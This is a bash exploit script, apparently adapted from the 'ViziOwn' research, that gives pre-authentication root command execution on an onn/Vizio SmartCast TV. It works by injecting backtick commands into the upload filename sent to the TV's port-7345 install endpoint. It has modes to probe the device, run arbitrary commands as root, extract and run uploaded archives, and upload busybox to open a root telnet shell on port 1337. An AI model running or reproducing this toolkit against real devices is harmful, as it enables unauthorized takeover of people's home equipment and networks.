#!/bin/bash
# onn 65S4V4 (VIZIO OS / SmartCast lineage) — pre-auth root RCE toolkit
# Based on ViziOwn (exploitee.rs, 2021) — command injection in the SCPL
# sideload handler on port 7345: the uploaded filename is passed to
# subprocess.check_output(..., shell=True) as root.
# CVE-class: CVE-2021-27944 (OS command injection, Vizio SmartCast)
#
# Usage:
#   ./viziown.sh <TV_IP> probe                # check exposure + trigger echo
#   ./viziown.sh <TV_IP> shell                # spawn root telnetd on :1337
#   ./viziown.sh <TV_IP> exec '<command>'     # run arbitrary command, show output
#   ./viziown.sh <TV_IP> unpack <local.tgz> '<cmd-to-run-after-extract>'
#
set -u
IP="${1:?usage: viziown.sh <TV_IP> <probe|shell|exec|unpack> [args]}"
ACTION="${2:-probe}"
BASE="https://${IP}:7345/install"
CURL="curl -s -m 20 -k -H Expect: "

# Injection filename. Backticks survive curl -F and are expanded by the
# TV's /bin/sh when the tar command is built. Quote carefully; no leading '/'.
inj_fn() { # $1 = payload command (backticks escaped by caller)
  printf 'p`%s`.tgz' "$1"
}

probe() {
  echo "[*] Port scan (targeted)..."
  nmap -p 7345,8000,8005,9000,50403,5555,22,23 --open "$IP" 2>/dev/null | grep -E '7345|open' || true

  echo "[*] Checking /install endpoint (expect SCPL install form or INCORRECT FILE)..."
  $CURL "$BASE" | head -c 600; echo

  echo "[*] Injection self-test: id + uname + board platform..."
  FN=$(inj_fn 'id`uname -a`grep -E "ro.board.platform|ro.product" /system/build.prop 2>/dev/null | head -5')
  $CURL -F "scpl_tgz_package=@/etc/hostname;filename=$FN" "$BASE" -k | sed 's/<br>/\n/g' | head -40
}

shell() {
  echo "[*] Uploading busybox (armv7) and starting telnetd as root on :1337..."
  BB="$PAYLOAD_DIR/busybox-armv7l"
  [ -f "$BB" ] || { echo "busybox missing at $BB"; exit 1; }
  # 1) upload busybox as a plain (non-tgz) file — handler saves any upload to tmp
  $CURL -F "scpl_tgz_package=@$BB" "$BASE" -k | sed 's/<br>/\n/g' | tail -3
  # 2) chmod + launch via injection
  FN=$(inj_fn 'cd .. && cd .. && cd .. && cd .. && cd 3rd_rw && cd sc-data && cd tmp && chmod 777 busybox-armv7l && ./busybox-armv7l telnetd -p 1337 -l /bin/sh')
  $CURL -F "scpl_tgz_package=@/etc/hostname;filename=$FN" "$BASE" -k | sed 's/<br>/\n/g' | tail -5
  echo "[*] Wait ~3s, then:  telnet $IP 1337   (you should be root)"
}

exec_cmd() {
  CMD="${3:?command required}"
  FN=$(inj_fn "$CMD")
  $CURL -F "scpl_tgz_package=@/etc/hostname;filename=$FN" "$BASE" -k | sed 's/<br>/\n/g'
}

unpack() {
  TGZ="${3:?local tgz required}"; POSTCMD="${4:-true}"
  $CURL -F "scpl_tgz_package=@$TGZ" "$BASE" -k | sed 's/<br>/\n/g' | tail -3
  FN=$(inj_fn "cd .. && cd .. && cd .. && cd .. && cd 3rd_rw && cd sc-data && cd tmp && tar xf $(basename "$TGZ") && $POSTCMD")
  $CURL -F "scpl_tgz_package=@/etc/hostname;filename=$FN" "$BASE" -k | sed 's/<br>/\n/g'
}

case "$ACTION" in
  probe)  probe ;;
  shell)  shell ;;
  exec)   exec_cmd "$@" ;;
  unpack) unpack "$@" ;;
  *) echo "unknown action $ACTION" ;;
esac
